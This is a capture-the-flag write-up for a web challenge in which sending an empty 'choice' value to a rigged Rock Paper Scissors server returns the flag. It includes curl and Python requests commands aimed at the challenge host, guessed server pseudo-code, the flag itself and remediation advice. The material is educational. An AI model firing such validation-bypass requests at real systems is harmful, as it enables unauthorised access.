Rock Paper Scissors CTF Writeup
📋 Challenge Overview
Title: Rock Paper Scissors
Category: Web Exploitation
Difficulty: Easy
Points: 325
Challenge Creator: @dtx7791
Host: http://18.143.187.55:5001

🎯 The Challenge
We're presented with a classic Rock Paper Scissors game interface. The twist? The description tells us "Computer Always Win! but maybe not..." - a clear hint that there's a way to outsmart the system and get the flag.

The website has three simple buttons:

🪨 Rock (value: 1)

📄 Paper (value: 2)

✂️ Scissors (value: 3)

🔍 Initial Reconnaissance
First, let's understand what we're working with. When you play normally, the computer apparently always wins. This suggests the server-side logic is rigged against the player.

Looking at the HTML source, we see the game sends a POST request to /play with a choice parameter containing either 1, 2, or 3.

🕵️‍♂️ The Investigation
I started by testing various inputs to understand how the server validates and processes our choices:

Testing Normal Inputs
bash
# All normal choices result in the computer winning
curl -X POST http://18.143.187.55:5001/play -d "choice=1"
curl -X POST http://18.143.187.55:5001/play -d "choice=2"  
curl -X POST http://18.143.187.55:5001/play -d "choice=3"
Testing Invalid Numbers
bash
# Out of bounds numbers get rejected
curl -X POST http://18.143.187.55:5001/play -d "choice=0"
# Response: {"error":"Invalid choice. Please use 1 (rock), 2 (paper), or 3 (scissors)"}
Testing Edge Cases
After various attempts with special characters, SQL injection payloads, and type juggling attempts, I decided to test something simple:

bash
# What if we send an empty choice?
curl -X POST http://18.143.187.55:5001/play -d "choice="
Bingo! 🎯

💥 The Exploit
The server doesn't properly handle empty input. When we send choice= (an empty string), we get:

json
{
  "message": "Congratulations! You won!",
  "flag": "BINGOCTF{r0ck_p4p3r_sc1ss0rs_m4st3r}"
}
🧠 Understanding the Vulnerability
Here's what's likely happening behind the scenes:

Flawed Validation: The server checks if input is 1, 2, or 3, but doesn't account for empty strings

Type Confusion: The empty string "" might be treated differently in comparisons

Logic Bypass: The "always win" logic for the computer fails when faced with unexpected input

The server code probably looks something like this (pseudo-code):

python
def play_game(user_choice):
    # Flawed validation
    if user_choice not in ['1', '2', '3']:
        return "Invalid choice"
    
    # Rigged game logic (computer always picks winning move)
    computer_choice = get_winning_move(user_choice)
    
    # Comparison that breaks with empty string
    if check_win(user_choice, computer_choice):
        return get_flag()  # 🚩 This gets triggered with empty input!
    else:
        return "Computer wins!"
🚀 The Solution
Simply send a POST request with an empty choice parameter:

One-liner solution:

bash
curl -X POST http://18.143.187.55:5001/play -d "choice=" | grep -o "BINGOCTF{.*}"
Or using Python:

python
import requests

url = "http://18.143.187.55:5001/play"
response = requests.post(url, data={"choice": ""})
print(response.json()["flag"])
🏆 The Flag
BINGOCTF{r0ck_p4p3r_sc1ss0rs_m4st3r}

📝 Key Takeaways
Always test edge cases - empty strings, null values, and boundary conditions

Don't trust client-side validation - server-side checks must be robust

Simple tests often work - sometimes the solution is simpler than expected

Read error messages carefully - they often reveal validation logic

🔒 How to Fix This
Developers should:

Validate for empty/null inputs explicitly

Use strict type checking

Implement comprehensive input sanitization

Test with unusual and malicious inputs during development

🎉 Conclusion
This challenge was a great example of how incomplete input validation can lead to unexpected behavior. The "computer always wins" logic had a critical flaw when faced with an empty input, allowing us to bypass the rigged system and claim victory!
